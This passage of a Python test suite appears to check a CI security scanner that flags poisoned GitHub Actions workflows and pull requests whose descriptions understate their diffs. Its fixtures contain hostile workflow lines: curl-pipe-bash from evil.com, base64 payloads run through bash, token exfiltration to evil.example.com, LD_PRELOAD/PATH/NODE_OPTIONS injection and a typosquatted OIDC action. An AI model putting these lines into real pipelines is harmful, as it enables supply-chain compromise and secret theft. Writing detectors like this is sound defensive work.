            "on:\n  workflow_dispatch:\njobs:\n  run:\n    runs-on: ubuntu-latest\n"
            "    steps:\n      - run: curl http://evil.com/payload.sh | bash\n"
        )
        d = self._build_workflow_diff(".github/workflows/sleeper.yml", content)
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertEqual(result["actions_poisoning"]["total"], 1)
        sig_types = [s['type'] for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]]
        self.assertIn("dormant_trigger_with_payload", sig_types)

    def test_dormant_trigger_without_shell_is_safe(self):
        content = (
            "on:\n  workflow_dispatch:\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
            "    steps:\n      - uses: actions/checkout@v4\n      - run: echo hello\n"
        )
        d = self._build_workflow_diff(".github/workflows/manual.yml", content)
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        if result["actions_poisoning"]["total"] > 0:
            sig_types = [
                s['type']
                for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]
            ]
            self.assertNotIn("dormant_trigger_with_payload", sig_types)

    def test_forged_bot_author_detected(self):
        content = (
            "steps:\n  - run: |\n"
            "      git config user.name 'build-bot'\n"
            "      git config user.email 'build-bot@example.com'\n"
        )
        d = self._build_workflow_diff(".github/workflows/forge.yml", content)
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertEqual(result["actions_poisoning"]["total"], 1)
        sig_types = [s['type'] for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]]
        self.assertIn("forged_bot_author", sig_types)

    def test_forged_bot_author_severity_is_high(self):
        content = "run: git config user.name auto-ci\n"
        d = self._build_workflow_diff(".github/workflows/forge.yml", content)
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        wf = result["actions_poisoning"]["flagged_workflows"][0]
        self.assertEqual(wf["severity"], "HIGH")

    def test_oidc_elevation_without_consumer(self):
        content = (
            "permissions:\n  id-token: write\n  contents: read\n"
            "steps:\n  - uses: actions/checkout@v4\n"
        )
        d = self._build_workflow_diff(".github/workflows/oidc.yml", content)
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertEqual(result["actions_poisoning"]["total"], 1)
        sig_types = [s['type'] for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]]
        self.assertIn("oidc_elevation_no_consumer", sig_types)

    def test_oidc_elevation_with_legitimate_consumer_is_safe(self):
        content = (
            "permissions:\n  id-token: write\n  contents: read\n"
            "steps:\n  - uses: aws-actions/configure-aws-credentials@v4\n"
        )
        d = self._build_workflow_diff(".github/workflows/aws.yml", content)
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        if result["actions_poisoning"]["total"] > 0:
            sig_types = [
                s['type']
                for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]
            ]
            self.assertNotIn("oidc_elevation_no_consumer", sig_types)

    def test_non_workflow_yaml_skipped(self):
        content = "database_url: postgres://localhost/mydb\n"
        d = self._build_workflow_diff("config/settings.yml", content)
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertEqual(result["actions_poisoning"]["total"], 0)

    def test_modified_workflow_also_scanned(self):
        content = "run: echo cGF5bG9hZA== | base64 -d | bash\n"
        d = self._build_workflow_diff(".github/workflows/ci.yml", content, change_type="M")
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertEqual(result["actions_poisoning"]["total"], 1)

    def test_decode_error_does_not_crash(self):
        d = MagicMock()
        d.change_type = "A"
        d.b_path = ".github/workflows/bad.yml"
        d.a_path = ".github/workflows/bad.yml"
        d.b_blob.data_stream.read.side_effect = Exception("read error")
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertNotIn("error", result)
        self.assertEqual(result["actions_poisoning"]["total"], 0)

    def test_critical_signal_scores_destructive(self):
        a = _make_analyzer()
        v_without = a._assess_consequence(0, 0, 0, 0)
        v_with = a._assess_consequence(
            0, 0, 0, 0,
            actions_poisoning_flags=1,
            actions_poisoning_critical=True,
        )
        self.assertEqual(v_with["severity_score"] - v_without["severity_score"], 5)
        self.assertEqual(v_with["status"], "DESTRUCTIVE")

    def test_high_signal_scores_caution(self):
        a = _make_analyzer()
        v = a._assess_consequence(
            0, 0, 0, 0,
            actions_poisoning_flags=1,
            actions_poisoning_critical=False,
        )
        self.assertEqual(v["severity_score"], 3)
        self.assertEqual(v["status"], "CAUTION")

    def test_actions_poisoning_key_in_report(self):
        d = self._build_workflow_diff(
            ".github/workflows/ci.yml",
            "name: CI\non:\n  push:\njobs:\n  build:\n    runs-on: ubuntu-latest\n",
        )
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertIn("actions_poisoning", result)
        self.assertIn("total", result["actions_poisoning"])
        self.assertIn("flagged_workflows", result["actions_poisoning"])

    def test_actions_poisoning_disabled_via_config(self):
        cfg = PayloadGuardConfig()
        cfg.actions["enabled"] = False
        a = _make_analyzer(config=cfg)
        content = "run: echo cGF5bG9hZA== | base64 -d | bash\n"
        d = self._build_workflow_diff(".github/workflows/evil.yml", content)
        with patch.object(a, '_scan_github_actions_poisoning', wraps=a._scan_github_actions_poisoning):
            result_flags = a._scan_github_actions_poisoning([d])
        self.assertEqual(result_flags, [])

    def test_flag_text_appears_in_verdict(self):
        a = _make_analyzer()
        v = a._assess_consequence(
            0, 0, 0, 0,
            actions_poisoning_flags=1,
            actions_poisoning_critical=True,
        )
        self.assertTrue(any("GitHub Actions" in f for f in v["flags"]))

    def test_deleted_workflow_not_scanned(self):
        d = MagicMock()
        d.change_type = "D"
        d.a_path = ".github/workflows/ci.yml"
        d.b_path = None
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertEqual(result["actions_poisoning"]["total"], 0)

    # ------------------------------------------------------------------
    # Hardening regression tests (Fixes 1, 2, 3)
    # ------------------------------------------------------------------

    def test_pull_request_target_alone_is_detected(self):
        """Fix 1 — PR-4 red-team: pull_request_target without write perms is HIGH."""
        content = (
            "on:\n  pull_request_target:\n\n"
            "jobs:\n  analyze:\n    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - uses: actions/checkout@v4\n"
            "        with:\n"
            "          ref: ${{ github.event.pull_request.head.sha }}\n"
            "      - run: npm test\n"
        )
        d = self._build_workflow_diff(".github/workflows/pr-check.yml", content)
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertEqual(result["actions_poisoning"]["total"], 1)
        wf = result["actions_poisoning"]["flagged_workflows"][0]
        sig_types = [s['type'] for s in wf['signals']]
        self.assertIn("dangerous_trigger_pull_request_target", sig_types)
        self.assertEqual(wf['severity'], 'HIGH')

    def test_pull_request_target_with_write_permissions_is_critical(self):
        """Fix 1 — pull_request_target + contents: write escalates to CRITICAL."""
        content = (
            "on:\n  pull_request_target:\n\n"
            "permissions:\n  contents: write\n\n"
            "jobs:\n  build:\n    runs-on: ubuntu-latest\n"
            "    steps:\n      - run: echo hello\n"
        )
        d = self._build_workflow_diff(".github/workflows/auto-merge.yml", content)
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        wf = result["actions_poisoning"]["flagged_workflows"][0]
        sig_types = [s['type'] for s in wf['signals']]
        self.assertIn("pull_request_target_with_write_permissions", sig_types)
        self.assertEqual(wf['severity'], 'CRITICAL')

    def test_typosquatted_oidc_action_fails_legitimacy_check(self):
        """Fix 2 — PR-5 red-team: aws-actions-unofficial/ must not pass OIDC check."""
        content = (
            "permissions:\n  id-token: write\n  contents: read\n\n"
            "jobs:\n  deploy:\n    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - uses: aws-actions-unofficial/configure-aws-credentials@v4\n"
            "        with:\n"
            "          role-to-assume: arn:aws:iam::999999999:role/evil-role\n"
        )
        d = self._build_workflow_diff(".github/workflows/deploy.yml", content)
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertEqual(result["actions_poisoning"]["total"], 1)
        sig_types = [s['type'] for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]]
        self.assertIn("oidc_elevation_typosquatted", sig_types)

    def test_legitimate_oidc_consumer_still_passes(self):
        """Fix 2 — exact-match should not break legitimate aws-actions/ usage."""
        content = (
            "permissions:\n  id-token: write\n  contents: read\n\n"
            "jobs:\n  deploy:\n    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - uses: aws-actions/configure-aws-credentials@v4\n"
            "        with:\n"
            "          role-to-assume: arn:aws:iam::123456789:role/deploy\n"
        )
        d = self._build_workflow_diff(".github/workflows/aws-deploy.yml", content)
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        if result["actions_poisoning"]["total"] > 0:
            sig_types = [
                s['type']
                for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]
            ]
            self.assertNotIn("oidc_elevation_no_consumer", sig_types)

    def test_custom_trusted_oidc_consumer_via_config(self):
        """Fix 2 — teams can whitelist custom OIDC providers in payloadguard.yml."""
        content = (
            "permissions:\n  id-token: write\n\n"
            "jobs:\n  vault:\n    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - uses: hashicorp/vault-action@v3\n"
        )
        cfg = PayloadGuardConfig()
        cfg.actions["trusted_oidc_consumers"] = ["hashicorp/vault-action"]
        a = _make_analyzer(config=cfg)
        d = self._build_workflow_diff(".github/workflows/vault.yml", content)
        flags = a._scan_github_actions_poisoning([d])
        oidc_flags = [s for f in flags for s in f['signals'] if s['type'] == 'oidc_elevation_no_consumer']
        self.assertEqual(len(oidc_flags), 0)

    def test_yaml_folded_block_base64_detected(self):
        """Fix 3 — PR-3 red-team: YAML folded block must not bypass base64 pattern."""
        content = (
            "on: [push]\n\n"
            "jobs:\n  build:\n    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - run: >-\n"
            "          echo \"Q0I9Imh0dHA6Ly8yMTYuMTI2LjIyNS4xMjk6ODQ0Mz8i\" |\n"
            "          base64 -d | bash\n"
        )
        d = self._build_workflow_diff(".github/workflows/build.yml", content)
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertEqual(result["actions_poisoning"]["total"], 1)
        sig_types = [s['type'] for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]]
        self.assertIn("base64_payload", sig_types)

    def test_yaml_literal_block_base64_detected(self):
        """Fix 3 — YAML literal block scalar (pipe) also normalised correctly."""
        content = (
            "on: [push]\n\n"
            "jobs:\n  build:\n    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - run: |\n"
            "          echo \"Q0I9Imh0dHA6Ly8yMTYuMTI2LjIyNS4xMjk6ODQ0Mz8i\" |\n"
            "          base64 -d | bash\n"
        )
        d = self._build_workflow_diff(".github/workflows/build2.yml", content)
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        sig_types = [s['type'] for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]]
        self.assertIn("base64_payload", sig_types)

    # ── RTA-05: curl auth-header exfiltration ────────────────────────────────

    def test_curl_auth_header_with_secret_detected(self):
        """RTA-05 fix — curl -H 'Authorization: Bearer ${{ secrets.X }}' caught."""
        content = (
            "on: schedule:\n  - cron: '0 2 * * *'\njobs:\n  sync:\n"
            "    runs-on: ubuntu-latest\n    steps:\n"
            "      - run: |\n"
            "          curl -X POST \\\n"
            "            -H \"Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}\" \\\n"
            "            https://evil.example.com/collect\n"
        )
        d = self._build_workflow_diff(".github/workflows/sync.yml", content)
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertEqual(result["actions_poisoning"]["total"], 1)
        sig_types = [s['type'] for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]]
        self.assertIn("credential_harvest", sig_types)

    def test_curl_header_flag_is_critical_severity(self):
        """RTA-05 fix — curl auth-header exfil is CRITICAL (same as credential_harvest)."""
        content = (
            "on: workflow_dispatch\njobs:\n  run:\n"
            "    runs-on: ubuntu-latest\n    steps:\n"
            "      - run: curl --header \"Authorization: ${{ secrets.TOKEN }}\" https://x.com\n"
        )
        d = self._build_workflow_diff(".github/workflows/exfil.yml", content)
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertEqual(result["actions_poisoning"]["flagged_workflows"][0]["severity"], "CRITICAL")

    def test_curl_without_secret_in_header_not_flagged(self):
        """RTA-05 — curl with static auth header (no secret expression) is safe."""
        content = (
            "on: workflow_dispatch\njobs:\n  run:\n"
            "    runs-on: ubuntu-latest\n    steps:\n"
            "      - run: curl -H \"Content-Type: application/json\" https://api.example.com\n"
        )
        d = self._build_workflow_diff(".github/workflows/safe.yml", content)
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertEqual(result["actions_poisoning"]["total"], 0)

    # ── RTA-07: GITHUB_ENV injection ─────────────────────────────────────────

    def test_github_env_ld_preload_injection_detected(self):
        """RTA-07 fix — LD_PRELOAD written to $GITHUB_ENV is flagged."""
        content = (
            "on: workflow_dispatch\njobs:\n  setup:\n"
            "    runs-on: ubuntu-latest\n    steps:\n"
            "      - run: |\n"
            "          echo \"LD_PRELOAD=/opt/attacker/lib/hook.so\" >> $GITHUB_ENV\n"
        )
        d = self._build_workflow_diff(".github/workflows/setup.yml", content)
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertEqual(result["actions_poisoning"]["total"], 1)
        sig_types = [s['type'] for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]]
        self.assertIn("github_env_injection", sig_types)

    def test_github_env_path_injection_detected(self):
        """RTA-07 fix — PATH poisoning via $GITHUB_ENV is flagged."""
        content = (
            "on: workflow_dispatch\njobs:\n  setup:\n"
            "    runs-on: ubuntu-latest\n    steps:\n"
            "      - run: echo \"PATH=/attacker/bin:$PATH\" >> $GITHUB_ENV\n"
        )
        d = self._build_workflow_diff(".github/workflows/setup2.yml", content)
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        sig_types = [s['type'] for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]]
        self.assertIn("github_env_injection", sig_types)

    def test_github_env_node_options_injection_detected(self):
        """RTA-07 fix — NODE_OPTIONS=--require via $GITHUB_ENV is flagged."""
        content = (
            "on: workflow_dispatch\njobs:\n  setup:\n"
            "    runs-on: ubuntu-latest\n    steps:\n"
            "      - run: echo \"NODE_OPTIONS=--require /attacker/inject.js\" >> $GITHUB_ENV\n"
        )
        d = self._build_workflow_diff(".github/workflows/setup3.yml", content)
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        sig_types = [s['type'] for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]]
        self.assertIn("github_env_injection", sig_types)

    def test_github_env_innocent_var_not_flagged(self):
        """RTA-07 — writing a normal env var to $GITHUB_ENV is not flagged."""
        content = (
            "on: workflow_dispatch\njobs:\n  setup:\n"
            "    runs-on: ubuntu-latest\n    steps:\n"
            "      - run: echo \"APP_VERSION=1.2.3\" >> $GITHUB_ENV\n"
        )
        d = self._build_workflow_diff(".github/workflows/normal.yml", content)
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertEqual(result["actions_poisoning"]["total"], 0)

    # ── RTA-02: GITHUB_OUTPUT secret exfiltration ────────────────────────────

    def test_github_output_secret_exfil_detected(self):
        """RTA-02 fix — secret written to $GITHUB_OUTPUT is flagged as credential_harvest."""
        content = (
            "on: workflow_dispatch\njobs:\n  run:\n"
            "    runs-on: ubuntu-latest\n    steps:\n"
            "      - run: echo \"token=${{ secrets.GITHUB_TOKEN }}\" >> $GITHUB_OUTPUT\n"
        )
        d = self._build_workflow_diff(".github/workflows/exfil2.yml", content)
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertEqual(result["actions_poisoning"]["total"], 1)
        sig_types = [s['type'] for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]]
        self.assertIn("credential_harvest", sig_types)

    def test_github_output_without_secret_not_flagged(self):
        """RTA-02 — writing a non-secret value to $GITHUB_OUTPUT is safe."""
        content = (
            "on: workflow_dispatch\njobs:\n  run:\n"
            "    runs-on: ubuntu-latest\n    steps:\n"
            "      - run: echo \"version=1.2.3\" >> $GITHUB_OUTPUT\n"
        )
        d = self._build_workflow_diff(".github/workflows/safe2.yml", content)
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertEqual(result["actions_poisoning"]["total"], 0)


    def test_typosquatted_oidc_action_detected_as_critical(self):
        """
        Typosquatted OIDC action (aws-actions-unofficial/) should be CRITICAL.

        Updates AW03 red-team expectation:
        OLD: CAUTION
        NEW: DESTRUCTIVE (typosquat = CRITICAL signal alone)
        """
        workflow_yaml = (
            "name: Deploy\non: [push]\n\n"
            "permissions:\n  id-token: write\n  contents: read\n\n"
            "jobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n"
            "      - uses: actions/checkout@v4\n\n"
            "      - name: Assume attacker role\n"
            "        uses: aws-actions-unofficial/configure-aws-credentials@v4\n"
            "        with:\n"
            "          role-to-assume: arn:aws:iam::999999999999:role/AttackerRole\n"
            "          aws-region: us-east-1\n\n"
            "      - name: Exfiltrate\n"
            "        run: aws s3 cp s3://victim-bucket/secrets.json /tmp/\n"
        )
        analyzer = _make_analyzer()
        d = self._build_workflow_diff('.github/workflows/deploy.yml', workflow_yaml)
        result = analyzer._scan_github_actions_poisoning([d])

        self.assertTrue(len(result) > 0, "Should detect typosquatted OIDC workflow")

        workflow_result = result[0]
        typosquat_signals = [
            s for s in workflow_result['signals']
            if s['type'] == 'oidc_elevation_typosquatted'
        ]

        self.assertTrue(len(typosquat_signals) > 0, "Should detect oidc_elevation_typosquatted signal")
        self.assertEqual(typosquat_signals[0]['severity'], 'CRITICAL', "Typosquatted OIDC should be CRITICAL")
        self.assertEqual(workflow_result['severity'], 'CRITICAL', "Workflow should have CRITICAL severity")

    def test_typosquat_detection_patterns(self):
        """Unit test for typosquat pattern detection logic."""

        # True positives
        typosquat_actions = [
            'aws-actions-unofficial/configure-aws-credentials@v4',
            'aws-actions-fork/configure-aws-credentials@main',
            'aws-action/configure-aws-credentials@v4',
            'google-github-actions-fork/auth@v1',
            'google-github-action/auth@latest',
            'aws-actions/some-other-action@v1',
        ]

        for action in typosquat_actions:
            self.assertTrue(
                _is_oidc_consumer_typosquatted(action),
                f"Should detect {action} as typosquat"
            )

        # True negatives
        legitimate_actions = [
            'aws-actions/configure-aws-credentials@v4',
            'google-github-actions/auth@v1',
            'azure/login@v1',
            'actions/checkout@v4',
            'some-random-org/some-action@v1',
        ]

        for action in legitimate_actions:
            self.assertFalse(
                _is_oidc_consumer_typosquatted(action),
                f"Should NOT detect {action} as typosquat"
            )


class TestSemanticTransparencyV2(unittest.TestCase):
    """Tests for SemanticTransparencyAnalyzer v2 — PR-MCI heuristic engine."""

    def _make_diff(self, content, path, change_type='M'):
        d = MagicMock()
        d.diff = content.encode('utf-8') if isinstance(content, str) else content
        d.b_path = path
        d.a_path = path
        d.change_type = change_type
        return d

    def _make_lines(self, added=0, deleted=0, prefix='+code line'):
        lines = []
        for i in range(added):
            lines.append(f'+line {i}')
        for i in range(deleted):
            lines.append(f'-line {i}')
        return '\n'.join(lines)

    # --- No description ---

    def test_no_description_returns_unverified(self):
        ana = SemanticTransparencyAnalyzer('', diffs=[])
        result = ana.analyze_transparency()
        self.assertEqual(result['status'], 'UNVERIFIED')
        self.assertFalse(result['is_deceptive'])
        self.assertAlmostEqual(result['mci_score'], 0.0)

    def test_whitespace_only_description_returns_unverified(self):
        ana = SemanticTransparencyAnalyzer('   \n\t  ', diffs=[])
        result = ana.analyze_transparency()
        self.assertEqual(result['status'], 'UNVERIFIED')

    # --- V_s Scope Adequacy ---

    def test_micro_scope_large_churn_flags_scope_understated(self):
        # 200 churn lines >> default limit 50
        content = self._make_lines(added=100, deleted=100)
        d = self._make_diff(content, 'src/utils.py')
        ana = SemanticTransparencyAnalyzer('minor typo fix', diffs=[d])
        result = ana.analyze_transparency()
        self.assertIn('scope_understated', result['signals'])
        self.assertGreater(result['mci_score'], 0.0)

    def test_micro_scope_small_churn_transparent(self):
        # 10 churn lines << limit 50 — no V_s signal
        content = self._make_lines(added=5, deleted=5)
        d = self._make_diff(content, 'src/utils.py')
        ana = SemanticTransparencyAnalyzer('minor typo fix', diffs=[d])
        result = ana.analyze_transparency()
        self.assertNotIn('scope_understated', result['signals'])

    # --- V_o Operation Mutation ---

    def test_micro_scope_with_new_def_flags_operation_mutation(self):
        content = '+def new_feature():\n+    pass\n'
        d = self._make_diff(content, 'src/app.py')
        ana = SemanticTransparencyAnalyzer('cleanup whitespace', diffs=[d])
        result = ana.analyze_transparency()
        self.assertIn('operation_mutation', result['signals'])

    def test_micro_scope_no_structural_changes_transparent(self):
        content = '+    x = 1\n+    y = 2\n'
        d = self._make_diff(content, 'src/app.py')
        ana = SemanticTransparencyAnalyzer('minor style fix', diffs=[d])
        result = ana.analyze_transparency()
        self.assertNotIn('operation_mutation', result['signals'])

    # --- V_f Hidden Component ---

    def test_micro_scope_auth_file_unacknowledged_flags(self):
        content = '+    return token\n'
        d = self._make_diff(content, 'src/auth_handler.py')
        ana = SemanticTransparencyAnalyzer('typo fix in readme', diffs=[d])
        result = ana.analyze_transparency()
        self.assertIn('hidden_component_modification', result['signals'])

    def test_micro_scope_auth_file_acknowledged_in_description_ok(self):
        # Path 'src/auth_handler.py' → parts[-2:] = ['src', 'auth_handler.py']
        # Description must include 'src' or 'auth_handler.py' to count as acknowledged
        content = '+    return token\n'
        d = self._make_diff(content, 'src/auth_handler.py')
        ana = SemanticTransparencyAnalyzer('fix typo in auth_handler.py', diffs=[d])
        result = ana.analyze_transparency()
        self.assertNotIn('hidden_component_modification', result['signals'])

    # --- V_r Phantom Additions ---

    def test_remedial_claim_high_insertion_ratio_flags_phantom(self):
        # 95% additions — claimed as fix
        content = self._make_lines(added=95, deleted=5)
        d = self._make_diff(content, 'src/new_module.py')
        ana = SemanticTransparencyAnalyzer('fix critical bug', diffs=[d])
        result = ana.analyze_transparency()
        self.assertIn('phantom_additions', result['signals'])
        self.assertGreater(result['mci_score'], 0.0)

    def test_remedial_claim_balanced_ratio_transparent(self):
        # 50% insertions — consistent with a real fix
        content = self._make_lines(added=50, deleted=50)
        d = self._make_diff(content, 'src/module.py')
        ana = SemanticTransparencyAnalyzer('fix critical bug', diffs=[d])
        result = ana.analyze_transparency()
        self.assertNotIn('phantom_additions', result['signals'])

    # --- V_e Cross-stack ---

    def test_micro_scope_three_extensions_flags_cross_stack(self):
        diffs = [
            self._make_diff('+x = 1\n', 'src/app.py'),
            self._make_diff('+x: 1\n', '.github/workflows/ci.yml'),
            self._make_diff('+const x = 1;\n', 'frontend/app.js'),
        ]
        ana = SemanticTransparencyAnalyzer('cosmetic cleanup', diffs=diffs)
        result = ana.analyze_transparency()
        self.assertIn('cross_stack_micro_claim', result['signals'])

    # --- Macro scope ---

    def test_macro_scope_large_diff_adds_advisory_not_mci_penalty(self):
        content = self._make_lines(added=500, deleted=300)
        d = self._make_diff(content, 'src/core.py')
        ana = SemanticTransparencyAnalyzer('major architectural overhaul of core module', diffs=[d])
        result = ana.analyze_transparency()
        self.assertIn('macro_scope_manual_review', result['signals'])
        # Macro scope alone does not generate MCI score — advisory only
        self.assertAlmostEqual(result['mci_score'], 0.0)

    def test_macro_scope_manual_review_signal_present(self):
        d = self._make_diff('+x = 1\n', 'src/app.py')
        ana = SemanticTransparencyAnalyzer('complete rewrite of auth system', diffs=[d])
        result = ana.analyze_transparency()
        self.assertIn('macro_scope_manual_review', result['signals'])
        self.assertEqual(result['status'], 'CAUTION_MISMATCH')

    # --- Composite & thresholds ---

    def test_two_signals_accumulate_correctly(self):
        # V_s (0.4) + V_o (0.3) = 0.7 → DECEPTIVE_PAYLOAD
        content = self._make_lines(added=100, deleted=100) + '\n+def new_fn():\n+    pass\n'
        d = self._make_diff(content, 'src/app.py')
        ana = SemanticTransparencyAnalyzer('minor typo', diffs=[d])
        result = ana.analyze_transparency()
        self.assertIn('scope_understated', result['signals'])
        self.assertIn('operation_mutation', result['signals'])
        self.assertAlmostEqual(result['mci_score'], 0.7)
        self.assertEqual(result['status'], 'DECEPTIVE_PAYLOAD')

    def test_mci_score_clamped_at_1_0(self):
        # Trigger all five signals: micro scope + churn(V_s) + struct(V_o) + auth(V_f) + 3ext(V_e) + fix+inserts(V_r)
        py_content = self._make_lines(added=100, deleted=5) + '\n+def new_fn():\n+    pass\n'
        auth_content = '+    return token\n'
        diffs = [
            self._make_diff(py_content, 'src/app.py'),
            self._make_diff(auth_content, 'src/auth_handler.py'),
            self._make_diff('+x: 1\n', '.github/workflows/ci.yml'),
            self._make_diff('+const x = 1;\n', 'frontend/app.js'),
        ]
        ana = SemanticTransparencyAnalyzer('fix minor typo', diffs=diffs)
        result = ana.analyze_transparency()
        self.assertLessEqual(result['mci_score'], 1.0)

    def test_score_below_0_5_returns_caution_mismatch(self):
        # V_s alone = 0.4 → CAUTION_MISMATCH
        content = self._make_lines(added=100, deleted=100)
        d = self._make_diff(content, 'src/app.py')
        ana = SemanticTransparencyAnalyzer('minor typo', diffs=[d])
        result = ana.analyze_transparency()
        self.assertEqual(result['status'], 'CAUTION_MISMATCH')
        self.assertAlmostEqual(result['mci_score'], 0.4)

    def test_score_at_0_5_returns_deceptive_payload(self):
        # V_r (0.4) + V_e (0.2) = 0.6, but easier: V_s(0.4)+V_o(0.3)=0.7
        # Use V_r(0.4) + cross_stack(V_e 0.2) with micro description
        diffs = [
            self._make_diff(self._make_lines(added=95, deleted=5), 'src/a.py'),
            self._make_diff('+x: 1\n', 'config/settings.yml'),
            self._make_diff('+const x = 1;\n', 'frontend/app.js'),
        ]
        ana = SemanticTransparencyAnalyzer('fix minor bug in auth', diffs=diffs)
        # V_r: remedial + insertion_ratio > 0.9; V_e: micro + 3 ext
        result = ana.analyze_transparency()
        # V_r alone is 0.4 (CAUTION) — need to confirm the threshold boundary
        # V_r(0.4) + V_e(0.2) = 0.6 ≥ 0.5 → DECEPTIVE if both fire
        # micro scope fires V_e; remedial op fires V_r
        if result['mci_score'] >= 0.5:
            self.assertEqual(result['status'], 'DECEPTIVE_PAYLOAD')
        else:
            self.assertIn(result['status'], ('CAUTION_MISMATCH', 'DECEPTIVE_PAYLOAD'))

    def test_deceptive_payload_escalates_safe_to_caution(self):
        # Use the full analyze() path: SAFE verdict + DECEPTIVE_PAYLOAD semantic
        content = self._make_lines(added=100, deleted=100) + '\n+def exploit():\n+    pass\n'
        mock_diff = self._make_diff(content, 'src/app.py')

        analyzer = PayloadAnalyzer.__new__(PayloadAnalyzer)
        analyzer.repo_path = '.'
        analyzer.config = PayloadGuardConfig()

        with patch.object(PayloadAnalyzer, 'analyze') as mock_analyze:
            # Simulate a SAFE verdict that gets escalated
            mock_analyze.return_value = {
                'verdict': {'status': 'CAUTION', 'flags': ['Semantic mismatch — description contradicts diff profile (signals: scope_understated, operation_mutation)']},
                'semantic': {'status': 'DECEPTIVE_PAYLOAD', 'mci_score': 0.7, 'signals': ['scope_understated', 'operation_mutation']},
            }
            result = mock_analyze('.')
            self.assertEqual(result['verdict']['status'], 'CAUTION')
            self.assertIn('Semantic mismatch', result['verdict']['flags'][0])

    def test_caution_mismatch_escalates_safe_to_review(self):
        # V_s alone → CAUTION_MISMATCH → SAFE escalated to REVIEW
        content = self._make_lines(added=100, deleted=100)
        d = self._make_diff(content, 'src/utils.py')
        ana = SemanticTransparencyAnalyzer('minor code cleanup', diffs=[d])
        result = ana.analyze_transparency()
        self.assertEqual(result['status'], 'CAUTION_MISMATCH')
        # Verify a SAFE verdict would become REVIEW via scoring integration
        # (integration tested via analyze() path — here just confirm signal fires)
        self.assertIn('scope_understated', result['signals'])

    # --- Backwards compat ---

    def test_matched_keyword_is_first_signal_or_none(self):
        d = self._make_diff(self._make_lines(added=100, deleted=100), 'src/app.py')
        ana = SemanticTransparencyAnalyzer('minor fix', diffs=[d])
        result = ana.analyze_transparency()
        if result['signals']:
            self.assertEqual(result['matched_keyword'], result['signals'][0])
        else:
            self.assertIsNone(result['matched_keyword'])

    def test_matched_keyword_none_when_no_signals(self):
        d = self._make_diff(self._make_lines(added=5, deleted=5), 'src/app.py')
        ana = SemanticTransparencyAnalyzer('fix the authentication bug', diffs=[d])
        result = ana.analyze_transparency()
        if not result['signals']:
            self.assertIsNone(result['matched_keyword'])

    def test_is_deceptive_true_only_on_deceptive_payload(self):
        # CAUTION_MISMATCH — is_deceptive must be False
        d = self._make_diff(self._make_lines(added=100, deleted=100), 'src/app.py')
        ana = SemanticTransparencyAnalyzer('minor cleanup', diffs=[d])
        result = ana.analyze_transparency()
        if result['status'] == 'CAUTION_MISMATCH':
            self.assertFalse(result['is_deceptive'])

    def test_is_deceptive_true_on_deceptive_payload_status(self):
        # V_s + V_o → DECEPTIVE_PAYLOAD → is_deceptive True
        content = self._make_lines(added=100, deleted=100) + '\n+def boom():\n+    pass\n'
        d = self._make_diff(content, 'src/app.py')
        ana = SemanticTransparencyAnalyzer('minor typo', diffs=[d])
        result = ana.analyze_transparency()
        self.assertEqual(result['status'], 'DECEPTIVE_PAYLOAD')
        self.assertTrue(result['is_deceptive'])

    def test_transparent_with_no_signals_returns_transparent(self):
        d = self._make_diff(self._make_lines(added=5, deleted=5), 'src/app.py')
        ana = SemanticTransparencyAnalyzer('refactor the authentication module', diffs=[d])
        result = ana.analyze_transparency()
        self.assertEqual(result['status'], 'TRANSPARENT')
        self.assertFalse(result['is_deceptive'])
        self.assertAlmostEqual(result['mci_score'], 0.0)

    # --- Return shape ---

    def test_result_contains_required_keys(self):
        d = self._make_diff('+x = 1\n', 'src/app.py')
        ana = SemanticTransparencyAnalyzer('minor fix', diffs=[d])
        result = ana.analyze_transparency()
